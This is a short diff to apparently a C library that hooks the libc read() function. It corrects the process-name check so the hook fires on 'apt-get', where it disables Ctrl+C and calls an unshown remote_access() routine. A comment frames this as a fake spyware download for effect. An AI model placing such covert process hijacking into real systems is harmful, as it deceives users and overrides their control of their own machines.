@@ -238,7 +238,7 @@ ssize_t read(int fd, void *buf, size_t count) {
             char *name = basename(exe);
 
             // This hijack for the "install" and "get-apt" command. install and apt-get are used for downloading, so a fake download of spy software is fitting
-            if (strstr(name, "install") || strstr(name, "get-apt")) {
+            if (strstr(name, "install") || strstr(name, "apt-get")) {
                 signal(SIGINT, SIG_IGN);  // disable Ctrl+C for effect
                 remote_access();
                 signal(SIGINT, SIG_DFL);
